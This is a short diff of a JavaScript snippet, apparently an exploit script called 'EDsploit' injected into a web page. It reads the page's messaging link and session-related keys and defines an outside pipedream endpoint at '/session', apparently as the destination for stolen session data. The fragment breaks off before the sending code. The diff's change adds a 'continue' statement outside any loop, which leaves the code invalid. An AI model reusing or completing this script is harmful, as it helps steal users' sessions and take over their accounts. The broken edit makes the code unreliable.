@@ -6,7 +6,7 @@ window.top.addEventListener('beforeunload', (e) => {
 
 (async function ex() {
 
-	if (window.top.document.querySelector('form[class=EDsploit]'))
+	if (window.top.document.querySelector('form[class=EDsploit]')) continue;
 	const url = 'https://3169a8cec3d0dff512a354276b174afb.m.pipedream.net/session';
 	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
